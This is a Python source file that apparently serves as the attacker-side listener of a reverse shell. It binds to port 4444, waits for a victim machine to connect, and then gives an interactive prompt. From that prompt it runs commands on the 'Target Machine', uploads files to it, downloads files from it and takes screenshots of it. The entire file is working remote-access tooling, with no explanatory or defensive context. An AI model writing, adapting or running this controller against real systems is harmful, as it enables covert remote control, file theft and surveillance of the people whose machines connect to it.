import os
import socket
import json
import subprocess
from termcolor import colored


def data_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(file):
    f = open(file, "rb")
    target.send(f.read())


def download_file(file):
    f = open(file, "wb")
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def t_commun():
    count = 0
    while True:
        comm = input("* Shell~%s: " % str(ip))
        data_send(comm)
        if comm == "exit":
            break
        elif comm == "clear":
            os.system("clear")
        elif comm[:3] == "cd ":
            pass
        elif comm[:6] == "upload":
            upload_file(comm[7:])
        elif comm[:8] == "download":
            download_file(comm[9:])
        elif comm[:10] == "screenshot":
            f = open("screenshot%d" % (count), "wb")
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif comm == "help":
            print(colored('''\n
            exit: Close the session on the Target Machine.
            clear: Clean the screen from the Terminal.
            cd + "DirectoryName": Change the directory on the Target Machine.
            upload + "FileName": Send a file to the Target Machine.
            download + "FileName": Download a file from the Target Machine.
            screenshot: Takes a screenshot from the Target Machine.
            help: Help the user to use the commands.
            '''), "green")
        else:
            answer = data_recv()
            print(answer)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("10.0.0.219", 4444))
print(colored("[-] Waiting for connections", "green"))
sock.listen(5)

target, ip = sock.accept()
print(colored("+ Connected with:" + str(ip), "green"))
t_commun()
